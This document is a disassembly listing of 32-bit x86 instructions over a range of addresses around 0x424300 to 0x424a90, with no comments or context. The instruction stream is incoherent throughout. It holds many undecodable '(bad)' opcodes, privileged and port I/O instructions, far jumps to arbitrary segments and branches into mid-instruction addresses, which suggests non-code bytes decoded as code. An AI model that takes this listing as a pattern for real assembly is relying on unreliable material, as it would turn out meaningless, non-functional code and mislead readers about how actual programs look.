  4242be:	mov    bl,BYTE PTR [edi-0x43e3203a]
  4242c4:	(bad)  
  4242c5:	cmc    
  4242c6:	inc    edx
  4242c7:	(bad)  
  4242c9:	mov    eax,0x5e8f03e0
  4242ce:	sub    BYTE PTR [esp+eiz*4-0x6d],cl
  4242d2:	adc    dh,BYTE PTR [edi]
  4242d4:	scas   al,BYTE PTR es:[edi]
  4242d5:	mov    eax,ds:0x9d61486c
  4242da:	mov    ecx,0x6f73b77c
  4242df:	or     DWORD PTR [ecx],edi
  4242e1:	(bad)  
  4242e2:	sub    dh,dh
  4242e4:	pop    ebp
  4242e5:	sub    BYTE PTR [edx+0x4bccb31a],0xce
  4242ec:	dec    ecx
  4242ed:	pop    eax
  4242ee:	fistp  QWORD PTR [edi+0xeeef1ec]
  4242f4:	adc    BYTE PTR [eax+eiz*4-0x78a2dc2a],dl
  4242fb:	aas    
  4242fc:	jb     0x424286
  4242fe:	sti    
  4242ff:	jb     0x424365
  424301:	bound  esi,QWORD PTR [ecx]
  424303:	shl    BYTE PTR [ebx-0xb1febd1],0x12
  42430a:	sub    al,0xa7
  42430c:	mov    ah,BYTE PTR [eax-0x7e6a6232]
  424312:	inc    eax
  424313:	mov    ds:0x9076488c,al
  424318:	test   DWORD PTR [eax+0x45af1bc9],edx
  42431e:	cwde   
  42431f:	loop   0x4242d0
  424321:	loope  0x424334
  424323:	xchg   ebp,eax
  424324:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424325:	fst    st(0)
  424327:	or     BYTE PTR [eax],bh
  424329:	jo     0x424332
  42432b:	loope  0x42434a
  42432d:	xor    eax,0x662ed7fc
  424332:	xchg   edi,eax
  424333:	or     al,0xd3
  424335:	pop    edi
  424336:	adc    al,0xa5
  424338:	adc    al,0xb3
  42433a:	jmp    0x3e34:0xe284c5f
  424341:	in     al,dx
  424342:	jb     0x424396
  424344:	mov    ch,0x3a
  424346:	inc    esp
  424347:	(bad)  
  424348:	push   ss
  424349:	mov    ebx,ecx
  42434b:	cmp    BYTE PTR [ecx-0x5c],al
  42434e:	mov    ch,0xc5
  424350:	or     DWORD PTR [esp+esi*8-0x18624b79],eax
  424357:	test   DWORD PTR [edi],ebp
  424359:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42435a:	fdivr  QWORD PTR [ecx]
  42435c:	andnps xmm0,XMMWORD PTR [ebp-0xd]
  424360:	mov    bh,0x13
  424362:	es mov cl,0x44
  424365:	push   ecx
  424366:	stc    
  424367:	fisub  DWORD PTR [ebp-0x4f51e7db]
  42436d:	mov    esi,0xce2c45e0
  424372:	pop    esi
  424373:	xor    ch,BYTE PTR [edi+0x4329a7fd]
  424379:	dec    ecx
  42437a:	and    BYTE PTR ds:0xe1a6a6da,cl
  424380:	jle    0x424356
  424382:	mov    eax,ebp
  424384:	lea    eax,cs:[esi+edx*8]
  424388:	push   ss
  424389:	leave  
  42438a:	loope  0x42430d
  42438c:	retf   0x6e78
  42438f:	and    al,0x73
  424391:	push   0x2bb39cbd
  424396:	jo     0x4243da
  424398:	pop    esp
  424399:	das    
  42439a:	int3   
  42439b:	das    
  42439c:	lods   al,BYTE PTR ds:[esi]
  42439d:	neg    DWORD PTR [edx+esi*4+0x41]
  4243a1:	dec    esp
  4243a2:	in     al,dx
  4243a3:	aad    0xdf
  4243a5:	(bad)
  4243a9:	xor    al,0x5b
  4243ab:	in     al,dx
  4243ac:	stos   DWORD PTR es:[edi],eax
  4243ad:	dec    edi
  4243ae:	(bad)  
  4243b0:	mov    ah,0xe3
  4243b2:	cmp    DWORD PTR [ecx],esi
  4243b4:	push   ecx
  4243b5:	mov    dl,0xe2
  4243b7:	xor    dl,BYTE PTR [esi+0x4d]
  4243ba:	mov    bh,0xf8
  4243bc:	arpl   WORD PTR [edx+0x7e6fe63f],ax
  4243c2:	imul   DWORD PTR [ebp+0x6a]
  4243c5:	enter  0x8543,0x36
  4243c9:	push   edi
  4243ca:	mov    al,0x2d
  4243cc:	imul   dh
  4243ce:	or     ah,BYTE PTR [edx+eax*2]
  4243d1:	call   0xde613fb7
  4243d6:	arpl   WORD PTR [ecx+ebx*1],bx
  4243d9:	ja     0x424380
  4243db:	or     BYTE PTR [esi+0x70],0x60
  4243df:	hlt    
  4243e0:	pusha  
  4243e1:	mov    eax,0xa3d2d71
  4243e6:	dec    ecx
  4243e7:	popf   
  4243e8:	or     edi,DWORD PTR [esi]
  4243ea:	popf   
  4243eb:	xor    eax,0x74768186
  4243f0:	jbe    0x4243c4
  4243f2:	and    al,BYTE PTR [edi-0x6c]
  4243f5:	xchg   ecx,eax
  4243f6:	pop    edi
  4243f7:	or     ecx,DWORD PTR [ebx]
  4243f9:	jo     0x4243ce
  4243fb:	jp     0x424447
  4243fd:	mov    bh,0xef
  4243ff:	sub    bl,BYTE PTR [ebp-0x5ff26c2e]
  424405:	push   eax
  424406:	push   esp
  424407:	jno    0x424438
  424409:	outs   dx,DWORD PTR ds:[esi]
  42440a:	mov    cl,0x20
  42440c:	cld    
  42440d:	sbb    BYTE PTR [edx],0xcc
  424410:	imul   edx,DWORD PTR [ebx-0x6b1a3a39],0xbac3bcae
  42441a:	fwait
  42441b:	icebp  
  42441c:	sbb    al,0xe0
  42441e:	call   0xbefb:0xceed345b
  424425:	and    eax,DWORD PTR [ebx]
  424427:	popa   
  424428:	(bad)  
  424429:	fnstsw WORD PTR [eax+0x4a]
  42442c:	cmp    esi,eax
  42442e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42442f:	dec    esp
  424430:	dec    ebx
  424431:	sbb    ebx,ebx
  424433:	idiv   DWORD PTR [edx+0x17]
  424436:	hlt    
  424437:	mov    eax,ds:0x5f955672
  42443c:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  42443e:	or     ebx,0xffffff94
  424441:	and    BYTE PTR [eax+0xf],dh
  424444:	sub    edi,DWORD PTR [edi]
  424446:	fwait
  424447:	out    dx,eax
  424448:	xor    eax,0xe44b40ab
  42444d:	and    DWORD PTR [ebx+0x2d],edi
  424450:	inc    esi
  424451:	xor    ecx,ecx
  424453:	adc    eax,0xaf181b68
  424458:	mov    al,0xf6
  42445a:	xor    esi,DWORD PTR [edx]
  42445c:	jl     0x42443b
  42445e:	pushf  
  42445f:	mov    cl,0x1d
  424461:	mov    es,WORD PTR ds:0x726d1b8a
  424467:	cmp    edi,DWORD PTR ds:0xb867ff76
  42446d:	dec    ebx
  42446e:	data16 adc dh,BYTE PTR ds:0xe91b5a6c
  424475:	mov    ah,0xb4
  424477:	push   edi
  424478:	ja     0x424445
  42447a:	pop    ss
  42447b:	sub    ch,ch
  42447d:	pop    es
  42447e:	xchg   BYTE PTR [edx+ebp*1],dh
  424481:	add    ebp,0x942e9e
  424487:	loope  0x424419
  424489:	pusha  
  42448a:	call   0xe607dd03
  42448f:	pop    ss
  424490:	lea    ebx,[ecx]
  424492:	imul   ebx,DWORD PTR [ebx-0x5b7c5eab],0xffffffad
  424499:	mov    al,ds:0x39a9b099
  42449e:	outs   dx,DWORD PTR ds:[esi]
  42449f:	sbb    al,0xbd
  4244a1:	aas    
  4244a2:	ins    DWORD PTR es:[edi],dx
  4244a3:	(bad)  
  4244a6:	ficomp DWORD PTR [esi-0x20]
  4244a9:	mov    ecx,0x327abbf7
  4244ae:	push   esp
  4244af:	pop    ebx
  4244b0:	shr    DWORD PTR [ebx+ecx*4+0x1f4e978d],1
  4244b7:	inc    ecx
  4244b8:	cwde   
  4244b9:	pop    ss
  4244ba:	(bad)  [esi-0xd]
  4244bd:	xlat   BYTE PTR ds:[ebx]
  4244be:	lahf   
  4244bf:	(bad)  
  4244c0:	xor    al,BYTE PTR [edi]
  4244c2:	iret   
  4244c3:	icebp  
  4244c4:	(bad)  
  4244c5:	xor    DWORD PTR [edi+ecx*4],edi
  4244c8:	add    BYTE PTR [ebx],0x3b
  4244cb:	mov    al,0x53
  4244cd:	jnp    0x42448c
  4244cf:	or     DWORD PTR [edx],ebx
  4244d1:	fisub  DWORD PTR [eax-0x73]
  4244d4:	inc    BYTE PTR [ebx+0x0]
  4244d7:	test   al,0x1
  4244d9:	clc    
  4244da:	mov    dl,0xb8
  4244dc:	dec    ebp
  4244dd:	ret    
  4244de:	mov    ebp,0x6714426e
  4244e3:	ds ss ret 0x40f1
  4244e8:	or     eax,0x80026ed5
  4244ed:	enter  0x598b,0x1d
  4244f1:	pop    ecx
  4244f2:	cli    
  4244f3:	outs   dx,BYTE PTR ds:[esi]
  4244f4:	scas   al,BYTE PTR es:[edi]
  4244f5:	pmulhw mm5,mm5
  4244f8:	pop    ebp
  4244f9:	(bad)  
  4244fb:	popf   
  4244fc:	in     al,0x2c
  4244fe:	mov    es,WORD PTR [eax]
  424500:	(bad)  
  424501:	sbb    ah,BYTE PTR ds:0x43a7af22
  424507:	dec    edi
  424508:	lahf   
  424509:	punpckhbw mm4,QWORD PTR [ebx+0x5d4ea551]
  424510:	cdq    
  424511:	inc    esi
  424512:	mov    eax,ds:0x154f20fb
  424517:	and    esi,eax
  424519:	push   edi
  42451a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42451b:	xor    eax,0x7542f452
  424520:	pop    ds
  424521:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424522:	dec    esi
  424523:	pop    ebx
  424524:	nop
  424525:	jae    0x424530
  424527:	repnz outs dx,DWORD PTR ds:[esi]
  424529:	mov    ch,0x5a
  42452b:	cld    
  42452c:	adc    al,0x58
  42452e:	cld    
  42452f:	jmp    0x424579
  424531:	fs out 0x63,al
  424534:	or     BYTE PTR [ecx+0x4b504686],bl
  42453a:	xor    eax,0x6f723f9c
  42453f:	jmp    0x42459c
  424541:	mul    BYTE PTR [ecx+ebx*1-0x2930a2e9]
  424548:	fsub   DWORD PTR [esi-0x4c8d8d87]
  42454e:	push   ss
  42454f:	xor    ebp,DWORD PTR [eax]
  424551:	push   ss
  424552:	dec    eax
  424553:	lahf   
  424554:	jbe    0x42453d
  424556:	mov    ebp,0x6428e7a6
  42455b:	xchg   edx,eax
  42455c:	xchg   ecx,eax
  42455d:	xchg   ebp,eax
  42455e:	lock retf 
  424560:	lahf   
  424561:	(bad)  
  424562:	xlat   BYTE PTR ds:[ebx]
  424564:	(bad)  
  424565:	pop    ebx
  424566:	repz dec sp
  42456a:	mov    al,0x98
  42456c:	mov    WORD PTR [ebp+0xf],es
  42456f:	cli    
  424570:	push   cs
  424571:	push   0xffffff84
  424573:	mov    eax,ds:0xe8613083
  424578:	and    esi,esi
  42457a:	inc    edx
  42457b:	mov    eax,ecx
  42457d:	add    eax,0x41bf6eb3
  424582:	shl    DWORD PTR [edi],1
  424584:	push   esi
  424585:	push   0x5e
  424587:	(bad)  
  424588:	mov    ch,0x61
  42458a:	cld    
  42458b:	xor    DWORD PTR [eax+0xd90ff5],ebp
  424591:	adc    eax,ebp
  424593:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  424595:	sub    al,0x23
  424597:	sub    BYTE PTR [ecx+0xc],ch
  42459a:	mov    edx,0x8366591c
  42459f:	cmc    
  4245a0:	mov    ?,WORD PTR [ebx]
  4245a2:	add    ebx,DWORD PTR [esi-0x36]
  4245a5:	mov    edx,0x9a7bc1bc
  4245aa:	sbb    eax,0x8237c809
  4245af:	pop    es
  4245b0:	enter  0x96e0,0xd
  4245b4:	mov    al,0xb5
  4245b6:	inc    esi
  4245b7:	pop    esi
  4245b8:	ror    DWORD PTR [ebx],1
  4245ba:	jecxz  0x4245b4
  4245bc:	mov    eax,ds:0xfb90fa1c
  4245c1:	push   eax
  4245c2:	shl    DWORD PTR [ebx],1
  4245c4:	adc    eax,0x6c82ef7d
  4245c9:	add    ah,dl
  4245cb:	add    DWORD PTR [edx+0x12],ecx
  4245ce:	sub    BYTE PTR ds:0xee1ffef8,bl
  4245d4:	scas   eax,DWORD PTR es:[edi]
  4245d5:	or     BYTE PTR [ebx],ch
  4245d7:	jae    0x424616
  4245d9:	mul    DWORD PTR [ecx-0xa1a0bbd]
  4245df:	push   0xfffffff5
  4245e1:	and    ebp,0xffffffe7
  4245e4:	xor    eax,0x21ec447f
  4245e9:	xlat   BYTE PTR ds:[ebx]
  4245ea:	shl    DWORD PTR [eax],0xd5
  4245ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4245ee:	or     al,0xc4
  4245f0:	jle    0x424666
  4245f2:	push   esi
  4245f3:	push   0xa3e45a82
  4245f8:	pop    ebp
  4245f9:	xor    al,0xff
  4245fb:	das    
  4245fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4245fd:	mov    ah,0xd
  4245ff:	mov    BYTE PTR [edi],dl
  424601:	jl     0x4245f1
  424603:	cmp    al,0x46
  424605:	push   edi
  424606:	aad    0xe4
  424608:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424609:	out    dx,eax
  42460a:	xchg   ebx,eax
  42460b:	jb     0x424600
  42460d:	jecxz  0x4245b4
  42460f:	adc    ecx,DWORD PTR [ebx]
  424611:	adc    eax,0x5ed8673d
  424616:	mov    WORD PTR [ebx],?
  424618:	mov    BYTE PTR [ecx+esi*2+0x2cccba64],0xf4
  424620:	lock mov DWORD PTR [ebx],esp
  424623:	fcmovnbe st,st(3)
  424625:	arpl   WORD PTR [ecx+0x3c2160e3],si
  42462b:	and    eax,0x41827a6a
  424630:	retf   
  424631:	sbb    edx,esi
  424633:	je     0x42469a
  424635:	mov    ch,0x1d
  424638:	xchg   al,bl
  42463a:	(bad)  
  42463b:	aas    
  42463c:	(bad)
  424640:	sub    DWORD PTR [esi-0x363051b3],0xb9a57642
  42464a:	jno    0x42460f
  42464c:	inc    esp
  42464d:	inc    ebp
  42464e:	inc    ebx
  42464f:	int    0xa7
  424651:	and    BYTE PTR [esi-0x4d],ch
  424654:	mov    al,0xa6
  424656:	jbe    0x424618
  424658:	push   edi
  424659:	sub    DWORD PTR [esi+eax*8-0x35a4a6fc],ebp
  424660:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424661:	cmp    ah,BYTE PTR [esi+0x5388518b]
  424667:	and    bl,BYTE PTR [edx+edi*1]
  42466a:	xchg   esi,eax
  42466b:	daa    
  42466c:	ins    DWORD PTR es:[edi],dx
  42466d:	cmovnp edi,DWORD PTR [ebx+0x4d35fda2]
  424674:	push   es
  424675:	iret   
  424676:	adc    cl,BYTE PTR [esi+0x3a]
  424679:	aaa    
  42467a:	mov    ds:0xe3c2621,al
  42467f:	jg     0x424629
  424681:	lock lods eax,DWORD PTR ds:[esi]
  424683:	jmp    0x5e20:0x3d797620
  42468a:	jl     0x7291cb0e
  424690:	add    dl,0xc1
  424693:	xchg   ebp,eax
  424694:	lods   eax,DWORD PTR ds:[esi]
  424695:	dec    ebp
  424696:	fcom   QWORD PTR [eax]
  424698:	stc    
  424699:	ins    DWORD PTR es:[edi],dx
  42469a:	in     eax,0xc1
  42469c:	sbb    eax,0x605937c9
  4246a1:	call   FWORD PTR [edi+0x2a]
  4246a4:	jge    0x4246dd
  4246a6:	push   0x8fb80792
  4246ab:	(bad)  
  4246ac:	ficom  DWORD PTR [ecx-0x1b83ff95]
  4246b2:	(bad)  
  4246b3:	mov    eax,ds:0xaf1d4b4b
  4246b8:	shl    DWORD PTR [edi],cl
  4246ba:	pop    edi
  4246bb:	and    ch,BYTE PTR [edx+0x5]
  4246be:	lods   eax,DWORD PTR ds:[esi]
  4246bf:	lahf   
  4246c0:	xor    ecx,0xfdf58506
  4246c6:	(bad)  
  4246c7:	jecxz  0x424656
  4246c9:	test   BYTE PTR ds:0xd840f3b,bl
  4246cf:	rcl    DWORD PTR [ebp-0x764deeb3],0x88
  4246d6:	adc    eax,0xa6262435
  4246db:	nop
  4246dc:	jp     0x4246fe
  4246de:	and    eax,0x429030e6
  4246e3:	lds    ecx,FWORD PTR ds:0x130c26c2
  4246e9:	mov    ds:0xb3778ca6,eax
  4246ee:	jne    0x424750
  4246f0:	stc    
  4246f1:	(bad)  
  4246f2:	fld    TBYTE PTR [esi+0x77ce32a4]
  4246f8:	ret    
  4246f9:	dec    edi
  4246fa:	cld    
  4246fb:	push   0x72
  4246fd:	mov    bl,0xd6
  4246ff:	int3   
  424700:	mov    dh,BYTE PTR [edx+edi*1+0x4]
  424704:	inc    eax
  424705:	psrlq  mm4,QWORD PTR [ebp+eiz*2+0x0]
  42470a:	mov    eax,ds:0x72a05d2e
  42470f:	sbb    eax,0xaac219e2
  424714:	stos   BYTE PTR es:[edi],al
  424715:	js     0x424732
  424717:	jle    0x424717
  424719:	enter  0x64b2,0x73
  42471d:	fimul  DWORD PTR [ebx+0x3f]
  424720:	loope  0x424765
  424722:	mov    ds:0x4152a4ba,eax
  424727:	jns    0x424747
  424729:	scas   eax,DWORD PTR es:[edi]
  42472a:	jmp    0x2090a256
  42472f:	pop    esp
  424730:	cwde   
  424731:	push   eax
  424732:	adc    al,0x4a
  424734:	mov    ecx,0x2ae54646
  424739:	stos   BYTE PTR es:[edi],al
  42473a:	lea    edi,[edi]
  42473c:	call   0x6df6:0xa260c794
  424743:	xchg   ecx,eax
  424744:	lock xchg esi,eax
  424746:	call   0xd33581ee
  42474b:	repz push ecx
  42474d:	xchg   edx,eax
  42474e:	mov    al,0xe4
  424750:	shr    bl,cl
  424752:	cwde   
  424753:	sub    eax,0x59a4a1a6
  424758:	hlt    
  424759:	js     0x4247d3
  42475b:	imul   esi,DWORD PTR [ebx-0x48eedcea],0xffffff83
  424762:	push   0x3f
  424764:	nop
  424765:	xchg   esp,eax
  424766:	mov    es,WORD PTR [edi-0x11]
  424769:	mov    ah,0xc3
  42476b:	xor    eax,0x9d6f86fb
  424770:	or     edx,DWORD PTR [esi+0x2e792f81]
  424776:	pop    eax
  424777:	ins    BYTE PTR es:[edi],dx
  424778:	bound  eax,QWORD PTR [edi+0x1b]
  42477b:	xchg   BYTE PTR [ecx-0x1a8e7080],bl
  424781:	aaa    
  424782:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424783:	aas    
  424784:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424785:	bnd jmp 0xa3687bb1
  42478b:	les    esi,FWORD PTR [ebp+0x3f]
  42478e:	outs   dx,DWORD PTR ds:[esi]
  42478f:	lds    edi,FWORD PTR [esi]
  424791:	sbb    DWORD PTR [eax],esi
  424793:	dec    ebp
  424794:	sub    DWORD PTR [edx-0x7918309f],esi
  42479a:	loope  0x424801
  42479c:	jns    0x4247c0
  42479e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42479f:	daa    
  4247a0:	jmp    0x62994ffd
  4247a5:	mov    dl,0x14
  4247a7:	mov    al,ds:0xf60bbe3b
  4247ac:	jle    0x4247b3
  4247ae:	cmp    DWORD PTR [edi],edx
  4247b0:	cs repz dec ecx
  4247b3:	sbb    eax,DWORD PTR [edi-0x4a65b77a]
  4247b9:	in     eax,dx
  4247ba:	sub    bh,BYTE PTR [eax]
  4247bc:	(bad)  
  4247bd:	in     al,dx
  4247be:	dec    edx
  4247bf:	sbb    bh,bh
  4247c1:	stc    
  4247c2:	dec    esi
  4247c3:	cmp    edi,DWORD PTR [edx]
  4247c5:	outs   dx,BYTE PTR ds:[esi]
  4247c6:	add    al,0x4b
  4247c8:	in     eax,dx
  4247c9:	dec    edx
  4247ca:	sbb    ah,ch
  4247cc:	fldcw  WORD PTR [ecx]
  4247ce:	and    al,0x48
  4247d0:	cmp    ah,BYTE PTR [edx+0x1b]
  4247d3:	cmp    DWORD PTR [ebx+0x4ea84bfe],eax
  4247d9:	mov    bh,0x23
  4247db:	xchg   dh,dl
  4247dd:	inc    ecx
  4247de:	jne    0x424857
  4247e0:	clc    
  4247e1:	sub    ebx,DWORD PTR [ecx-0x5da33edb]
  4247e7:	cmp    DWORD PTR [esi+0x49],esp
  4247ea:	(bad)  
  4247eb:	fisttp QWORD PTR [ebp+0x2fb6516c]
  4247f1:	shl    ch,1
  4247f3:	jbe    0x424777
  4247f5:	add    al,0xec
  4247f7:	push   ss
  4247f8:	inc    edx
  4247f9:	(bad)  
  4247fa:	fild   WORD PTR [esi]
  4247fc:	clc    
  4247fd:	xor    eax,0x4ddde89b
  424802:	(bad)  
  424803:	mov    al,ds:0x9aa0bce8
  424808:	ss out 0x3d,eax
  42480b:	inc    edx
  42480c:	int    0x6c
  42480e:	loope  0x424825
  424810:	xchg   esi,eax
  424811:	or     esi,edx
  424813:	add    dl,BYTE PTR [edx]
  424815:	cwde   
  424816:	jo     0x4247f3
  424818:	jo     0x424866
  42481a:	iret   
  42481b:	jb     0x4247ab
  42481d:	jmp    0x42483b
  42481f:	cli    
  424820:	inc    ebp
  424821:	inc    eax
  424822:	xchg   ebp,eax
  424823:	pop    eax
  424824:	xchg   edi,eax
  424825:	inc    edx
  424826:	clc    
  424827:	pop    edx
  424828:	cmp    al,0xc9
  42482a:	adc    DWORD PTR [edx-0x5f],ecx
  42482d:	call   0xd757:0x3bdc3a48
  424834:	xchg   ebp,eax
  424835:	aam    0x9e
  424837:	mov    ah,0x76
  424839:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42483a:	or     eax,0x90619d00
  42483f:	add    al,0x68
  424841:	int3   
  424842:	add    dh,BYTE PTR [edx]
  424844:	jbe    0x4247d4
  424846:	xor    eax,0x892ca543
  42484b:	das    
  42484c:	mov    ds:0x42e7187d,al
  424851:	push   edi
  424852:	shl    eax,0x76
  424855:	mov    WORD PTR [edi],ds
  424857:	adc    esi,ebp
  424859:	mov    eax,ds:0xe72fcaa2
  42485e:	leave  
  42485f:	mov    ch,0xb3
  424861:	xchg   edx,eax
  424862:	mov    BYTE PTR [esi+0x65],al
  424865:	pop    ss
  424866:	fadd   QWORD PTR [ecx+0x6b]
  424869:	jne    0x42480d
  42486b:	or     esi,edi
  42486d:	add    eax,0x9c245376
  424872:	jmp    0x424869
  424874:	jecxz  0x424849
  424876:	sar    DWORD PTR [esi-0x14961763],1
  42487c:	push   eax
  42487d:	js     0x42482b
  42487f:	adc    al,0xd6
  424881:	xor    ah,BYTE PTR [esi-0x6]
  424884:	or     eax,0x367feca0
  424889:	call   0xcbee1d16
  42488e:	jbe    0x424865
  424890:	xchg   edi,eax
  424891:	sbb    DWORD PTR [ebx],esp
  424893:	out    dx,eax
  424894:	je     0x4248f4
  424896:	sbb    cl,dl
  424898:	rol    edx,0xa3
  42489b:	mov    al,0xb0
  42489d:	pusha  
  42489e:	daa    
  42489f:	and    eax,0xc5e255cc
  4248a4:	loopne 0x424866
  4248a6:	aam    0xc2
  4248a8:	(bad)  
  4248a9:	int3   
  4248aa:	and    al,0x43
  4248ac:	setp   BYTE PTR [ecx-0x20]
  4248b0:	push   ecx
  4248b1:	fcom   DWORD PTR [ebx-0x52ce257]
  4248b7:	dec    edi
  4248b8:	mov    ds:0x2aa8d635,al
  4248bd:	sub    al,0xf1
  4248bf:	fdiv   QWORD PTR [eax+edi*2+0x2fe40009]
  4248c6:	fisttp QWORD PTR [edx-0x31]
  4248c9:	push   edx
  4248ca:	mov    DWORD PTR [ecx+esi*8],eax
  4248cd:	mov    BYTE PTR [ecx+0x4b7d1538],al
  4248d3:	repz ds xchg ebx,eax
  4248d6:	mov    ebx,0x41ec8350
  4248db:	dec    edx
  4248dc:	pop    edi
  4248dd:	lock add al,0xb6
  4248e0:	sbb    DWORD PTR [esi+0x751cc5b],esp
  4248e6:	push   ds
  4248e7:	add    BYTE PTR [ebp+0x26f70cd7],bh
  4248ed:	nop
  4248ee:	and    edi,ebp
  4248f0:	mov    al,ds:0xa2f49080
  4248f5:	sti    
  4248f6:	ins    BYTE PTR es:[edi],dx
  4248f7:	outs   dx,BYTE PTR ds:[esi]
  4248f8:	into   
  4248f9:	fincstp 
  4248fb:	sub    BYTE PTR [ebx+0x6c],0xe5
  4248ff:	fist   WORD PTR [ebp-0x29282a46]
  424905:	mov    DWORD PTR [esi],ebx
  424907:	iret   
  424908:	in     eax,dx
  424909:	js     0x42490f
  42490b:	mov    dl,0x70
  42490d:	lods   eax,DWORD PTR ds:[esi]
  42490e:	mov    ebx,0xa527627b
  424913:	mov    ebp,0x90043d5d
  424918:	add    eax,0xd1cfc7ec
  42491d:	nop
  42491e:	retf   
  42491f:	sbb    cl,BYTE PTR [edx]
  424921:	cmp    al,0x8e
  424923:	dec    esp
  424924:	pop    es
  424925:	inc    edi
  424926:	mov    es,edi
  424928:	jp     0x4248f6
  42492a:	xchg   DWORD PTR [edi-0x1db606a],esi
  424930:	test   al,0x33
  424932:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424933:	ins    BYTE PTR es:[edi],dx
  424934:	arpl   WORD PTR [ebx-0x70],ax
  424937:	fld    QWORD PTR [edx+0x4d9beb97]
  42493d:	or     BYTE PTR [edi-0x4856af86],dl
  424943:	jge    0x4248f2
  424945:	ins    BYTE PTR es:[edi],dx
  424946:	xor    al,0x37
  424948:	imul   ebp,DWORD PTR [ebx+0x3f3a5877],0xffffffd3
  42494f:	pop    esp
  424950:	mov    ah,0x97
  424952:	push   ds
  424953:	in     al,0xf4
  424955:	pop    DWORD PTR [ebp-0x4f75586a]
  42495b:	idiv   DWORD PTR [edx]
  42495d:	gs inc esi
  42495f:	jle    0x42490d
  424961:	xchg   esi,eax
  424962:	and    BYTE PTR [edx],bh
  424964:	fisubr DWORD PTR [ebp-0x717405c3]
  42496a:	pop    ds
  42496b:	and    esp,edi
  42496d:	inc    ecx
  42496e:	dec    ebx
  42496f:	mov    al,0x9d
  424971:	imul   ecx,DWORD PTR [ebx-0x52],0x589d52a2
  424978:	inc    BYTE PTR [ebp-0x1e05d65c]
  42497e:	push   0xffffffaa
  424980:	mov    edx,DWORD PTR [eax]
  424982:	out    dx,eax
  424983:	clc    
  424984:	jnp    0x4249e3
  424986:	call   0x6f2b:0x45fa76ae
  42498d:	pop    edi
  42498e:	sub    cl,BYTE PTR [esi]
  424990:	pushf  
  424991:	push   cs
  424992:	add    eax,0x946e6f0e
  424997:	xor    eax,0x6e57fd1c
  42499c:	and    eax,DWORD PTR [esp+edx*1+0x656d021a]
  4249a3:	mov    eax,0xf6f20117
  4249a8:	mov    es,ebx
  4249aa:	ret    0xa45d
  4249ad:	push   esp
  4249ae:	repnz cmp ebp,DWORD PTR gs:[eax-0x6e]
  4249b3:	hlt    
  4249b4:	fdivr  st,st(6)
  4249b6:	dec    esi
  4249b7:	mul    cl
  4249b9:	js     0x424a1f
  4249bb:	jbe    0x424948
  4249bd:	cwde   
  4249be:	mov    WORD PTR [ecx-0x23bc4e24],es
  4249c4:	xchg   edx,eax
  4249c5:	inc    esp
  4249c6:	ret    0x548c
  4249c9:	mov    esi,DWORD PTR [ecx-0x2]
  4249cc:	pop    eax
  4249cd:	sub    eax,ebx
  4249cf:	mov    BYTE PTR [esi+0x21],bh
  4249d2:	bound  ebx,QWORD PTR [esi+0x352472f3]
  4249d8:	(bad)
  4249dd:	mov    ebx,0x4431b59c
  4249e2:	fisubr DWORD PTR [eax]
  4249e4:	mov    ebp,0x73de1c0e
  4249ea:	jnp    0x4249e4
  4249ec:	add    al,0x46
  4249ee:	pushf  
  4249ef:	lock ror BYTE PTR [edi+0x3b5819a8],cl
  4249f6:	cmp    ecx,edi
  4249f8:	or     eax,0xd182a553
  4249fd:	sti    
  4249fe:	sbb    BYTE PTR [ebx-0x47060f1d],ah
  424a04:	jb     0x424a4f
  424a06:	push   es
  424a07:	addr16 cwde 
  424a09:	mov    esi,0x5df8c804
  424a0e:	(bad)  
  424a0f:	push   ss
  424a10:	out    dx,al
  424a11:	lock pop DWORD PTR [edi+0xcf9b893]
  424a18:	xchg   ecx,eax
  424a19:	xchg   ebp,eax
  424a1a:	jae    0x4249a0
  424a1c:	push   edx
  424a1d:	add    al,0x5d
  424a1f:	in     eax,0x43
  424a21:	(bad)  
  424a23:	retf   0x3e07
  424a26:	in     eax,0x69
  424a28:	or     DWORD PTR [eax-0x38e274a5],esi
  424a2e:	ja     0x4249cb
  424a30:	dec    esi
  424a31:	pop    edi
  424a32:	mov    BYTE PTR [esi],ah
  424a34:	call   0x8e32:0x1a5f6d24
  424a3b:	xchg   esi,eax
  424a3c:	dec    ecx
  424a3d:	outs   dx,BYTE PTR ds:[esi]
  424a3e:	mov    bl,0x2f
  424a40:	(bad)  
  424a41:	or     BYTE PTR [eax*4+0x64c7e228],dl
  424a48:	popf   
  424a49:	dec    ebx
  424a4a:	push   eax
  424a4b:	arpl   WORD PTR [eax],bp
  424a4d:	sbb    eax,0x62f1972e
  424a52:	aaa    
  424a53:	into   
  424a54:	das    
  424a55:	fisttp DWORD PTR [ebp-0x1b985cce]
  424a5b:	mov    dl,0x73
  424a5d:	inc    esi
  424a5e:	aad    0x9e
  424a60:	js     0x424a84
  424a62:	dec    ebp
  424a63:	out    dx,al
  424a64:	cmp    dl,BYTE PTR [ecx+ebp*1]
  424a67:	dec    esp
  424a68:	jo     0x424a66
  424a6a:	pop    esp
  424a6b:	jo     0x424ad5
  424a6d:	es stos BYTE PTR es:[edi],al
  424a6f:	in     al,dx
  424a70:	aaa    
  424a71:	(bad)  
  424a72:	int    0xe4
  424a74:	sbb    DWORD PTR fs:[ebx-0x2e50c21d],esi
  424a7b:	or     BYTE PTR [edi+0xc],0x74
  424a7f:	or     BYTE PTR [ebx],0x26
  424a82:	pushf  
  424a83:	iret   
  424a84:	pop    esi
  424a85:	adc    BYTE PTR [eax-0x6c],dl
  424a88:	aad    0x4e
  424a8a:	push   es
  424a8b:	dec    esp
  424a8c:	add    eax,0x48e8c00a
  424a91:	mov    esp,DWORD PTR [ebp-0x72]
  424a94:	push   ds
